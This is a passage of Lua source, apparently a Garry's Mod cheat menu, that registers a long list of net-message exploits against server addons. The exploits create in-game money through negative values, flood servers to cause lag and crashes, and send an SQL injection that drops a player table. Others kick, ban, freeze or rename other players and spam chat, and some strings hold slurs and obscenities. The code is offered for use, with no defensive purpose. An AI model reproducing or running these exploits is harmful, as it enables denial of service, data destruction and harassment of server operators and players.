	net.Start("CRAFTINGMOD_SHOP")
	net.WriteTable({
	BUY =   -100000000,
	type    =   1
	})
	net.WriteInt(1,16)
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #26","gives u free money from kart","kart_sell",function() 
	for i=1, 300 do
		net.Start("kart_sell")
		net.WriteString("sw_gokart")
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Free rp money #27","gives u free money (number in text entry)","ClickerAddToPoints",function() 
	net.Start("ClickerAddToPoints")
	net.WriteInt(tonumber(s.TE:GetText()), 32)
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free rp money #28","gives u free money (number in text entry)","TOW_SubmitWarning",function() 
	for k,v in pairs(ents.GetAll()) do 
		net.Start("TOW_SubmitWarning")
		net.WriteString(LocalPlayer():SteamID())
		net.WriteDouble(tonumber(s.TE:GetText()))
		net.WriteEntity(v)
		net.SendToServer()
		net.Start("TOW_PayTheFine")
		net.WriteEntity(v)
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Free rp money #29","Gives u free money from printerz","wordenns",function() 
	for k,v in pairs(ents.FindByClass("derma_printer")) do
		net.Start("wordenns")
		net.WriteEntity(v)
		net.SendToServer()
	end
	print("printerov:".. tostring(#ents.FindByClass("derma_printer")))
end, 1,0,"_sex_free_money_14",5)

s.AddExploit(3,"Free rp money #30","Exploit for money, Look at the car you bought to duplicate it. ;)","RXCAR_Shop_Store_C2S",function() 
	// duplic shit
	for i = 0, 75 do
		net.Start("RXCAR_Shop_Store_C2S");
		net.WriteTable( { E = ent } );
		net.SendToServer();
	end
	// sell shit
	local ent              
	for k,v in pairs(ents.GetAll()) do                 
	if v:GetClass() == "rm_car_dealer" then                
	ent = v                
	end                
	end
	for k,v in pairs(RX3DCar_Inventory) do                 
	net.Start( "RXCAR_SellINVCar_C2S" )                
	net.WriteTable({UN=v.UniqueID,SE=ent})                 
	net.SendToServer()                 
	end
end, 0,0)

s.AddExploit(3,"Free rp money #31","deposit shit","deposit",function()
	net.Start("deposit")
	net.WriteString("-10000000000000000000000")
	net.SendToServer()
end, 1,0,"_sex_free_money_15",5)

s.AddExploit(3,"Free rp money #32","Gives u free money from taxi","Taxi_Add",function() 
net.Start("Taxi_Add")
net.WriteString("MLG")
net.WriteTable({-1333.647461, -1473.931763, -139.968750})
net.WriteFloat(-99999999)
net.WriteString(Desc)
net.SendToServer()
end, 1,0,"_sex_free_money_16",1)

s.AddExploit(3,"Free rp money #33","Gives u free money","NET_SS_DoBuyTakeoff",function() 
net.Start('NET_SS_DoBuyTakeoff')
net.WriteEntity(LocalPlayer())
net.WriteEntity(swag)          
net.WriteTable({'spawned_weapon'})          
net.WriteInt(-100000000, 16)       
net.SendToServer() 
end, 1,0,"_sex_free_money_18",1)

s.AddExploit(3,"Free rp money #34","Gives u free money","DaHit",function() 
net.Start('DaHit')
net.WriteFloat( -1000 )
net.WriteEntity( LocalPlayer() )
net.SendToServer()
end, 1,0,"_sex_free_money_19",1)

//lagz|
s.AddExploit(2,"Lags? #1","Just lags","ATS_WARP_REMOVE_CLIENT",function() 
	for k,v in pairs(player.GetAll()) do
		for j=1,5 do
	        net.Start( "ATS_WARP_REMOVE_CLIENT" )
	        net.WriteEntity( v )
	        net.WriteString( "adminroom1" )
	        net.SendToServer()
	        net.Start( "ATS_WARP_FROM_CLIENT" )
	        net.WriteEntity( v )
	        net.WriteString( "adminroom1" )
	        net.SendToServer()
	        net.Start( "ATS_WARP_VIEWOWNER" )
	        net.WriteEntity( v )
	        net.WriteString( "adminroom1" )
			net.SendToServer()
		end
    end
end, 1,0,"_sex_lagz_1",0.1)

s.AddExploit(2,"Lags? #2","Just lags","CFRemoveGame",function() 
	for j=1,2000 do
		net.Start( "CFRemoveGame" )
		net.WriteFloat( math.Round("2147483646\n") )
        net.SendToServer()
        net.Start( "CFJoinGame" )
        net.WriteFloat( math.Round("2147483646\n") )
        net.SendToServer()
        net.Start( "CFEndGame" )
        net.WriteFloat( math.Round("2147483646\n") )
        net.SendToServer()
	end
end, 1,0,"_sex_lagz_2",0.1)

s.AddExploit(2,"Lags? #3","Just lags","CreateCase",function() 
		for j=1,2000 do
			net.Start( "CreateCase" )
            net.WriteString( s.LagText )
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_3",0.1)

s.AddExploit(2,"Lags? #4","Just lags","rprotect_terminal_settings",function() 
		for j=1,2000 do
			net.Start( "rprotect_terminal_settings" )
            net.WriteEntity( table.Random( player.GetHumans() ) )
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_4",0.1)

s.AddExploit(2,"Lags? #5","Just lags","StackGhost",function() 
		for j=1,1100 do
			net.Start( "StackGhost" )
            net.WriteInt( 69,32 )
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_5",0.3)

s.AddExploit(2,"Lags? #6","Just lags","JoinOrg",function() 
		for j=1,1000 do
			for k,v in pairs(player.GetAll()) do
				net.Start("JoinOrg")
				net.WriteEntity(v)
				net.WriteString(s.LagText)
				net.SendToServer()                         
			end
		end
end, 1,0,"_sex_lagz_6",0.02)

s.AddExploit(2,"Lags? #7","Just lags","pac_submit",function() 
		for j=1,2200 do
			net.Start("pac_submit")
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_7",0.3)

s.AddExploit(2,"Lags? #8","Just lags","steamid2",function() 
		for j=1,100 do
			net.Start( "steamid2" )
            //net.WriteString( s.LagText )
		    net.WriteString( "novogo_goda_ne_budet_ded_moroz_prinl_islam أنبوب الموسيقى😂😂👍👍" )
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_8",0)

s.AddExploit(2,"Lags? #9","Just lags","NDES_SelectedEmblem",function() 
		for j=1,2000 do
			net.Start( "NDES_SelectedEmblem" )
            net.WriteString( s.LagText )
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_9",0.5)

s.AddExploit(2,"Lags? #10","Just lags","Morpheus.StaffTracker",function() 
		for j=1,2000 do
			net.Start("Morpheus.StaffTracker")
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_10",0.1)

s.AddExploit(2,"Lags? #11","Just lags","join_disconnect",function() 
	local gay = player.GetAll()[1]
		for j=1,1100 do
			net.Start("join_disconnect")
            net.WriteEntity(gay)
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_11",0.05)

s.AddExploit(2,"Lags? #12","Just lags","EZS_PlayerTag",function() 
		for j=1,1000 do
			for k, v in pairs(player.GetAll()) do
	            net.Start( "EZS_PlayerTag" )
	            net.WriteEntity(v)
	           	net.WriteString(v:Name())
	            net.SendToServer()
            end
		end
end, 1,0,"_sex_lagz_12",0.2)

s.AddExploit(2,"Lags? #13","Just lags","textstickers_entdata",function() 
		for j=1,100 do
	        net.Start( "textstickers_entdata" )
            net.WriteUInt( 0xFFFFFFF, 32 )
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_13",0.5	)

s.AddExploit(2,"Lags? #14","Just lags","Keypad",function() 
		for i = 1, 1000 do
        	net.Start("Keypad")
            net.WriteEntity(LocalPlayer())
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_14",0)

s.AddExploit(2,"Lags? #15","Just lags","DarkRP_spawnPocket",function() 
	for i=1,10000 do
		net.Start("DarkRP_spawnPocket")
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_15",1)

s.AddExploit(2,"Lags? #16","Just lags","dLogsGetCommand",function() 
	for i=1,7000 do
		net.Start('dLogsGetCommand')
		net.WriteTable(s.lagz16)
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_16",3)


s.AddExploit(2,"Lags? #17","Just lags","ats_send_toServer",function() 
	for i=1,2000 do
		net.Start("ats_send_toServer")
		net.WriteTable({ " " , "Open" , nil , nil , nil , nil })
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_17",0.5)

s.AddExploit(2,"Lags? #18","Just lags","pac.net.TouchFlexes.ClientNotify",function() 
	for i=1, 400 do
		net.Start( "pac.net.TouchFlexes.ClientNotify" )
		net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999998, 13)
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_18",0.3)

s.AddExploit(2,"Lags? #19","just c00l lagger for hide and seek","ChangeToHiding",function()
	for i=1,10 do
		net.Start("ChangeToHiding")
		net.WriteString('You have to select a player before doing a action.')
		net.SendToServer()
		net.Start("ChangeToSpectator")
		net.WriteString('You have to select a player before doing a action.')
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_19",0.1)

s.AddExploit(2,"Lags? #20","Just lags","dronesrewrite_controldr",function() 
	for i=1,2200 do
		net.Start("dronesrewrite_controldr")
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_20",0.2)

s.AddExploit(2,"Lags? #21","Just lags","pac_to_contraption",function()
	for i=1, 900 do
		net.Start("pac_to_contraption")
		net.WriteInt( 9999999999999999999999999999999999999999999999999999999999999999999998, 13)
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_21",0.1)

s.AddExploit(2,"Lags? #22","Just lags","dlib.getinfo.replicate",function() 
		for j=1,2000 do
			net.Start("dlib.getinfo.replicate")
            net.SendToServer()
		end
end, 1,0,"_sex_lagz_22",0.3)

s.AddExploit(2,"Lags? #23","Just lags","sphys_dupe",function() 
	for i=1,2200 do
		net.Start("sphys_dupe")
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_23",0.2)

s.AddExploit(2,"Lags? #24","Just lags","minigun_drones_switch",function() 
	for i=1,2200 do
		net.Start("minigun_drones_switch")
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_24",0.2)

s.AddExploit(2,"Lags? #25","CW2  Just lags (u need cw2 weapon in hand)","CW20_PRESET_LOAD",function() 
	if(LocalPlayer():GetActiveWeapon():GetClass():find("cw"))then
		for i=1,2200 do
			net.Start("CW20_PRESET_LOAD")
			net.SendToServer()
		end
	end
end, 1,0,"_sex_lagz_25",0.2)

s.AddExploit(2,"Lags? #26","Just lags","SBP_addtime",function() 
	for i=1,2000 do
		net.Start("SBP_addtime")
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_26",0.3)

s.AddExploit(2,"Lags? #27","Just lags","TFA_Attachment_RequestAll",function() 
	for i=1, 500 do
		net.Start("TFA_Attachment_RequestAll")
		net.SendToServer()
	end
end, 1,0,"_sex_lagz_27",0.05)

s.AddExploit(1,"Lags? #28","Just Lags","properties",function()
	local e = LocalPlayer():GetEyeTrace().Entity
	if !e then return end
	
	for i=1,2000 do
		net.Start( "properties", true)
		net.WriteString("ignite")
		net.WriteUInt(e:EntIndex(),16)
		net.SendToServer()
		
		net.Start( "properties", true)
		net.WriteString("extinguish")
		net.WriteUInt(e:EntIndex(),16)
		net.SendToServer()
	end
end,1,0,"_sex_lags_28",0)

s.AddExploit(2,"Lags? #29","Just Lags","GExtension_Net_RequestLanguage",function()
	for i=1,2000 do
		net.Start( "GExtension_Net_RequestLanguage", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_29",0)

s.AddExploit(2,"Lags? #30","Just Lags","rtxappend2",function()
	for i=1,5000 do
		net.Start( "Progress", true)
		net.SendToServer()
		net.Start( "rtxappend2", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_30",0)

s.AddExploit(2,"Lags? #31","Just Lags","ba.GetStaffRequest",function()
	net.Start( "ba.GetStaffRequest")
	net.SendToServer()
	for i=1,5000 do
		net.Start( "ba.GetStaffRequest", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_31",0)

s.AddExploit(2,"Lags? #32","Just Lags","ba.cmd.sg.upload",function()
	net.Start( "ba.cmd.sg.upload")
	net.SendToServer()
	for i=1,5000 do
		net.Start( "ba.cmd.sg.upload", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_32",0)

s.AddExploit(2,"Lags? #33","Just Lags","HFM_DoCook_C2S",function()
	net.Start( "HFM_DoCook_C2S")
	net.SendToServer()
	net.Start( "HFM_GetFood_C2S")
	net.SendToServer()
	for i=1,5000 do
		net.Start( "HFM_DoCook_C2S", true)
		net.SendToServer()
		net.Start( "HFM_GetFood_C2S", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_33",0)

s.AddExploit(2,"Lags? #34","Just Lags","AdvDupe2_CanAutoSave",function()
	for i=1,5000 do
		net.Start( "AdvDupe2_CanAutoSave", true)
		net.SendToServer()
		net.Start( "AdvDupe2_SendGhosts", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_34",0)

s.AddExploit(2,"Lags? #35","Just Lags","EndGrab",function()
	net.Start( "EndGrab")
	net.SendToServer()
	for i=1,5000 do
		net.Start( "EndGrab", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_35",0)

s.AddExploit(2,"Lags? #36","Just Lags","ItemStoreSyncItem",function()
	for i=1,5000 do
		net.Start( "ItemStoreSyncItem", true)
		net.SendToServer()
		net.Start( "ItemStoreStartTrade", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_36",0)

s.AddExploit(2,"Lags? #37","Just Lags","lockpick_check",function()
	for i=1,5000 do
		net.Start( "lockpick_check", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_37",0)

s.AddExploit(2,"Lags? #38","Just Lags","pns",function()
	for i=1,5000 do
		net.Start( "pns", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_38",0)

s.AddExploit(2,"Lags? #39","Just Lags","cmd.Run",function()
	for i=1,5000 do
		net.Start( "cmd.Run", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_39",0)

s.AddExploit(2,"Lags? #40","Just Lags","NetWrapperRequest",function()
	for i=1,5000 do
		net.Start( "NetWrapperRequest", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_40",0)

s.AddExploit(2,"Lags? #41","Just Lags","sgGiveFriendStatusAll",function()
	for i=1,5000 do
		net.Start( "sgGiveFriendStatusAll", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_41",0)

s.AddExploit(2,"Lags? #42","Just Lags","tfaTracerSP",function()
	for i=1,5000 do
		net.Start( "tfaTracerSP", true)
		net.SendToServer()
	end
end,1,0,"_sex_lags_42",0)

s.AddExploit(2,"Lags? #43","Exploit to piss on the encoder processors","Taxi_Add",function()
	for i=1,5000 do
		net.Start( "Taxi_Add", true)
		net.WriteString("Taxi Super Exploit #"..math.random( 1, 9999 ))
		net.WriteTable({[1]=Pos.x,[2]=Pos.y,[3]=Pos.z})
		net.WriteFloat(-9999999)
		net.WriteString("The addons leaks is full of feat :D")
		net.SendToServer()
	end
end,1,0,"_sex_lags_43",0)

s.AddExploit(2,"Lags? #44","Just Lags","genericrone",function()
	for i=1,5000 do
		net.Start( "genericrone", true)
		net.WriteString("\n\n\n\n\n\n\n\n\n\n\n\n\n\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\n")
		net.SendToServer()

		
	end
end,1,0,"_sex_lags_44",0)

s.AddExploit(2,"Lags? #45","Just Lags","MineServer",function()
for i = 0, 100 do
	            for k, v in pairs(player.GetAll()) do
	                net.Start("MineServer", true)
	                net.WriteString("sell")
	                net.WriteEntity(v)
	                net.WriteString("Fuck you. Gonna ddos this shitty ass server niggers")
	                net.SendToServer()
	            end
	        end
end,1,0,"_sex_lags_45",0)

s.AddExploit(2,"Lags? #46","Just Lags","IDInv_RequestBank",function()
for i = 1, 1000 do
	net.Start("IDInv_RequestBank", true)
	net.SendToServer()
end
end,1,0,"_sex_lags_46",0)

s.AddExploit(2,"Lags? #47","Just Lags","VC_PlayerReady",function()
for i = 1, 1000 do
	net.Start("VC_PlayerReady", true)
	net.SendToServer()
end
end,1,0,"_sex_lags_47",0)

s.AddExploit(2,"Lags? #48","Just Lags","blueatm",function()
for i = 1, 1000 do
	net.Start("blueatm", true)
	net.WriteEntity(LocalPlayer())
	net.SendToServer()
end
end,1,0,"_sex_lags_48",0)

s.AddExploit(2,"Lags? #49","Just Lags","pp_info_send",function()
for i = 1, 1000 do
	net.Start("pp_info_send", true)
	net.SendToServer()
end
end,1,0,"_sex_lags_49",0)

s.AddExploit(2,"Lags? #50","Just Lags","IGS.GetPaymentURL",function()
for i = 1, 1000 do
	net.Start("IGS.GetPaymentURL", true)
	net.WriteDouble(9999999999999999999999999999999999999999999999999999999999)
	net.SendToServer()
end
end,1,0,"_sex_lags_50",0)

s.AddExploit(2,"Lags? #51","Just Lags","RequestMAPSize",function()
for i = 1, 400 do
	net.Start("RequestMAPSize")
	net.SendToServer()
end
end,1,0,"_sex_lags_51",0)

s.AddExploit(2,"Lags? #52","Just Lags","ItemStoreDrop",function()
for i = 1, 1000 do
	net.Start("ItemStoreDrop")
	net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
	net.SendToServer()
end
end,1,0,"_sex_lags_52",0)



s.AddExploit(2,"Lags? #53","Just Lags","EZS_PlayerTag",function()
for k, v in pairs(player.GetAll()) do
	net.Start("EZS_PlayerTag")
	net.WriteEntity(v)
	net.WriteString("Something is creating very strong script errors")
	net.SendToServer()
end
end,1,0,"_sex_lags_53",0)

s.AddExploit(2,"Lags? #54","Just Lags","DarkRP_spawnPocket",function()
for i=1, 600 do
	net.Start("DarkRP_spawnPocket")
	net.SendToServer()   
end
end,1,0,"_sex_lags_54",0)

//crashers

s.AddExploit(4,"Remove server sql data","Just removes data","pplay_sendtable",function() 
	local tbl = {}
    tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
    tbl.ply = LocalPlayer()
	net.Start("pplay_sendtable")
	net.WriteTable(tbl)
	net.SendToServer()
end, 0,0)

s.AddExploit(4,"fuck server data","Just rape server data","WriteQuery",function() 
	for i=1,2200 do
		net.Start( "WriteQuery" )
		--net.WriteString("1")
		net.SendToServer()
	end
end, 1,0,"_sex_rip_data",0.3)

s.AddExploit(4,"fuck server","Just rape server ","ATS_WARP_REMOVE_CLIENT",function() 
for k,v in pairs(player.GetAll()) do
net.Start("ATS_WARP_REMOVE_CLIENT")
net.WriteEntity( v )
net.WriteString("adminroom1")
net.SendToServer()
net.Start("ATS_WARP_FROM_CLIENT")
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
net.Start("ATS_WARP_VIEWOWNER")
net.WriteEntity( v )
net.WriteString( "adminroom1" )
net.SendToServer()
end
end, 1,0,"_sex_rip_serv",0.3)

s.AddExploit(4,"Legit server crash","absolytely legit lol","NET_SS_DoBuyTakeoff",function() 
	net.Start( "NET_SS_DoBuyTakeoff" )
	net.WriteEntity(LocalPlayer())
	net.WriteEntity(table.Random(player.GetAll()))
	net.WriteTable({})
	net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
	net.SendToServer()
end, 0,0)

s.AddExploit(4,"Crash shit server","SimplAC - sucks","SimplicityAC_aysent",function() 
	net.Start("SimplicityAC_aysent")
    net.WriteUInt(1, 8)
	net.WriteUInt(4294967295, 32)
 	net.WriteTable(_G)
 	net.SendToServer()
end, 0,0)


//bans
s.AddExploit(3,"Kick guys","Select a target and kick","NLRKick",function() 
	for i=1,#s.Target do
		net.Start("NLRKick") 
		net.WriteEntity(s.Target[i])
	    net.SendToServer()
    end
end, 0,0)

s.AddExploit(3,"Kick loxov","Abuses Jailbreak Votekick","JB_Votekick",function() 
for k,v in pairs(player.GetAll()) do
net.Start("JB_Votekick")
net.WriteEntity(v)
net.WriteString("\n\n\n\n\n\n\n\n\n\n\n\n\n\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\n")
net.SendToServer()
end
end, 0,0)

s.AddExploit(3,"Kick Targets","just kick selected players","plyWarning",function() 
	for i=1,#s.Target do
		timer.Simple(i,function()
			net.Start("plyWarning")
			net.WriteEntity(s.Target[i])
			net.WriteString('You have to select a player before doing a action.')
			net.SendToServer()
		end)
	end
end, 0,0)

s.AddExploit(3,"Freeze Targets","just freeze selected players","NLR.ActionPlayer",function() 
	for i=1,#s.Target do
		net.Start("NLR.ActionPlayer")
		net.WriteEntity(s.Target[i])
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Kick Targets","just kick selected players","uPLYWarning",function() 
	for i=1,#s.Target do
		timer.Simple(i,function()
			for j=0, 1000 do 
				net.Start("uPLYWarning")
				net.WriteEntity(s.Target[i])
				net.WriteString('You have to select a player before doing a action.')
				net.SendToServer()
			end
		end)
	end
end, 0,0)

s.AddExploit(3,"Ban Targets","just ban selected players","banleaver",function() 
	for i=1,#s.Target do
		net.Start("banleaver")
		net.WriteString(tostring(s.Target[i]:SteamID().."{sep}"..tostring(s.Target[i]:Name())))
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Kick Targets","just kick selected players","GetCar",function() 
	for i=1,#s.Target do
		timer.Simple(i,function()
			for j=0, 700 do 
				net.Start("GetCar")
				net.WriteEntity(s.Target[i])
				net.WriteEntity(s.Target[i])
				net.SendToServer()
			end
		end)
	end
end, 0,0)

s.AddExploit(3,"Kick targetz #idk","select gays and kick they","RecKickAFKer",function() 
	for i=1,#s.Target do
		net.Start("RecKickAFKer")
		net.WriteEntity(s.Target[i])
		net.SendToServer()
	end
end, 0,0)

s.AddExploit(3,"Kick all n00bz","Just kick all and you too","DL_Answering",function() 
	for i=1,1000 do 
	   	net.Start("DL_Answering")
	   	net.SendToServer()
    end
end, 1,0,"_sex_kick_noobz",0.1)

s.AddExploit(3,"Ban Targets","ban selected players && textentry input - ban message","gBan.BanBuffer",function() 
	for i=1,#s.Target do
		net.Start( "gBan.BanBuffer" )
		net.WriteBool( true )
		net.WriteInt( 0, 32 )
		net.WriteString( s.TE:GetText() )
		net.WriteString( s.Target[i]:SteamID() )
		net.SendToServer()
	end
end, 0,0)

local debiltab = {"Urbanichka","Abu","CasperCode","FikusCode","Ramzi"}

s.AddExploit(3,"Kick admins","Just test","friendlist",function() 
	for i=1,500 do
	net.Start("friendlist")
	for j=1,#debiltab do
		net.WriteType(j)
		net.WriteType(debiltab[j])
	end
	net.WriteType(nil)
		
	net.SendToServer()
	end
end, 1,0,"test",0.2)

local memes = {"lokidev_togglevar_mirror", "", "", ""}
local bibas={""}
s.AddExploit(4,"VIEBAT EBLANA","just viebat","send",function() 
	for i=1,#s.Target do
		if !IsValid(s.Target[i]) then
			table.remove(s.Target,i)
			print("offnuli")
			continue
		end
		local biba=s.Target[i]:EntIndex()
		for i=1,500 do
            net.Start("send",true)
            net.WriteTable(memes)
            net.WriteTable(bibas)
            net.WriteUInt( biba, 16 )
            net.WriteString("\n\n\n\n\n\n\n\n\n\n\n\n\n\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\nTEBYA VZLOMAL RAMZI\n")
            net.SendToServer()
        end
	end
end, 1,0,"sex_sex_sex",0)

s.AddExploit(4,"Ramzi hack","pokikat","send",function() 
	for i=1,#s.Target do
		for ii=1,20 do
			net.Start("send",true)
			
			--WriteTable 1
			net.WriteType(1)
			net.WriteType("lokidev_togglevar_mirror")
			net.WriteType(nil)
			--
			--WriteTable 2
			net.WriteType(1)
			net.WriteType("CasperCode")
			net.WriteType(nil)
			--
			--WriteEntity
			net.WriteUInt(s.Target[i]:EntIndex(), 16)
			--
			
			net.WriteString("\n\n\n\n\n\n\n\n\n\nHACKED BY RAMZI\nHACKED BY RAMZI\nHACKED BY RAMZI\nHACKED BY RAMZI")
			net.SendToServer()
		end
	end
end,1,0,"_sex_kick21212",0)


//chat
s.AddExploit(1,"Shitty console spam","type spam message in textentry","",function() 
	for i=1, 10 do
		LocalPlayer():ConCommand( "_u "..s.TE:GetText() )
	end
end, 1,0,"_sex_shit_con_spamer",0.1)

s.AddExploit(1,"Shitty console spam 2","type spam message in textentry","",function() 
	for i = 1, 200 do
	LocalPlayer():ConCommand( "usernameisdrillingthatconsole" )
	end
end, 1,0,"_sex_shit_con_spamer",0.1)

s.AddExploit(1,"Shitty  spam","lol","NET_BailPlayer",function() 
for k, v in pairs (player.GetAll()) do
net.Start("NET_BailPlayer")
net.WriteEntity( v )
net.WriteEntity( v )
net.SendToServer()
end
end, 1,0,"_sex_shit_spamers",0.1)

if s.ChatClear then
s.AddExploit(1,"Chat spam","real b1g spam","",function() 
		for i=1,2 do
			ChatClear.Run()
		end
end, 1,0,"_sex_chat_kill",0.01)
s.AddExploit(1,"Chat spam OOC","real b1g spam","",function() 
		for i=1,2 do
			ChatClear.OOC()
		end
end, 1,0,"_sex_chat_kill_2",0.01)
end

s.AddExploit(2,"Fuck Player Chat","just lag player who use atlas chat","atlaschat.chat",function()  -- need a test with lox
	for i=1,#s.Target do
		net.Start("atlaschat.rqclrcfg")
		net.WriteString(s.Target[i]:Name())
		net.SendToServer()
	end
end, 1,0,"_sex_atlas_fuck",0.1)


s.AddExploit(3,"Pospamit dibilu","drug...","sendtable",function()
	for i=1,#s.Target do
		if !IsValid(s.Target[i]) then
			table.remove(s.Target,i)
			print("offnuli")
			continue
		end
		for j=1,5 do
			net.Start("sendtable",true)
			net.WriteUInt(s.Target[i]:EntIndex(),16)
			
			for x=1,#debiltab do
				net.WriteType(x)
				net.WriteType(debiltab[x])
			end
			net.WriteType(nil)
			
			net.SendToServer()
		end
	end
end,1,0,"_sex_drug",1)

s.AddExploit(4,"Fuck name for all","type name in textentry","NC_GetNameChange",function() 
	for k, v in pairs( player.GetAll() ) do
        net.Start("NC_GetNameChange")
        net.WriteEntity(v)
        net.WriteString(s.TE:GetText())
        net.WriteString(s.TE:GetText())
        net.SendToServer()
    end
end, 0,0)

s.AddExploit(3,"Fuck names free","Fuck all rp names its cool","NC_GetNameChange",function() 
	for k, v in pairs( player.GetAll() ) do
		net.Start("NC_GetNameChange")
	    net.WriteEntity(v)
	   	net.WriteString(" ")
	    net.WriteString(" ")
	    net.SendToServer()
    end
end, 1,0,"_sex_fuckname",5)

s.AddExploit(3,"Ruku bagaem","Just bagaen","HatsChatIsTyping",function()
	net.Start( "HatsChatIsTyping" ) net.WriteBit( true ) net.SendToServer()
end,1,0,"_sex_pisat",0)

s.AddExploit(3,"Ruku bagaem","Just bagaen","ba.ToggleChat",function()
	net.Start( "ba.ToggleChat" ) net.WriteBit( true ) net.SendToServer()
end,0,0,"_sex_pisats",0)

//car
s.AddExploit(3,"Get Free le car","Write number in text entry (0 or 1 or more)","race_accept",function() 
	net.Start("race_accept")
	net.WriteInt(tonumber(s.TE:GetText()),16)
	net.SendToServer()
end, 0,0)

s.AddExploit(2,"Spawn Track","idk shit","FIRE_CreateFireTruck",function() 
	net.Start("FIRE_CreateFireTruck")
	net.SendToServer()  
end, 0,0)

s.AddExploit(3,"simfphys turnsignal spam","aaa","simfphys_turnsignal",function()
	for k,v in pairs(ents.FindByClass("gmod_sent_vehicle_fphysics_base"))do
		net.Start("simfphys_turnsignal",true)
		net.WriteInt(math.random(0,3),32)
		net.WriteEntity(v)
		net.SendToServer()
	end
end,1,0,"_sex_lights",0.5)


//weapons

s.AddExploit(3,"Free rp weapons","Gives u 3 weapons","ARMORY_RetrieveWeapon",function() 
	for i=1,3 do
		timer.Simple(i,function()
			net.Start("ARMORY_RetrieveWeapon")
		   	net.WriteString("weapon"..tostring(i))
			net.SendToServer()
		end)
	end
end, 0,0)

s.AddExploit(2,"Give physgun","Gives u free physgun","BuyFirstTovar",function() 
	net.Start("BuyFirstTovar")
	net.WriteString("0")
	net.SendToServer()
end, 0,0)

s.AddExploit(2,"Give physgun","Gives u free physgun","BuySecondTovar",function() 
	net.Start("BuySecondTovar")
	net.WriteString("0")
	net.SendToServer()
end, 0,0)

s.AddExploit(3,"Free Weapons","gives u more free weapons","MONEY_SYSTEM_GetWeapons",function() 
	for i = 1,32 do
		net.Start("MONEY_SYSTEM_GetWeapons")
		net.WriteInt(i, 8)
		net.SendToServer()
	end
end, 0,0)


s.AddExploit( 3, "Give weapons" , "Give some weapons for you (enter type)" , "CraftSomething" , function()
	net.Start( "CraftSomething" )
	    net.WriteEntity( LocalPlayer() )
	    net.WriteString( s.TE:GetText() )
	    net.WriteString( "" )
	    net.WriteString( "weapon" )
    net.SendToServer()
end, 0 , 0)

s.AddExploit( 3, "Inf ammo" , "buy inf ammo for you wepon" , "TCBBuyAmmo" , function()
	net.Start("TCBBuyAmmo")
	net.WriteTable( {nil,LocalPlayer():GetActiveWeapon():GetPrimaryAmmoType(),nil,"0","999999"} )
	net.SendToServer()
end, 0 , 0)

s.AddExploit( 3, "Give Weapons" , "Give some weapons for you example weapon_rpg (enter type)" , "give_me_weapon" , function()
	net.Start("give_me_weapon")
	net.WriteString(s.TE:GetText());
	net.SendToServer()
end, 0 , 0)

//health

s.AddExploit(4,"Set Health","type number of health in textentry","GiveHealthNPC",function() 
	net.Start("GiveHealthNPC")
	net.WriteString("100")
	net.SendToServer()
end, 1,0,"_sex_gay_timer",1)

s.AddExploit(3,"Health crazy","lol wtf u wot m8?","drugseffect_hpremove",function() 
	net.Start("drugseffect_hpremove")
    net.WriteString(math.random(0,999999))
    net.SendToServer()
end, 1,0,"_sex_u_wot_m8",0.5)

s.AddExploit(4,"God","Gives u godmode lol","RevivePlayer",function() 
		if(!LocalPlayer():Alive())then
			net.Start("RevivePlayer")
            net.WriteEntity(LocalPlayer())
			net.SendToServer()
		end
end, 1,0,"_sex_god",1)

//pointshop

s.AddExploit(2,"Unbox shit","idk check pointshop2 (F*)","net_PSUnBoxServer",function() 
	for k,v in pairs(player.GetAll()) do
		local i = 0
		for k2,v2 in pairs(PS.Items) do 
			if !v:PS_HasItem(v2.ID) then  
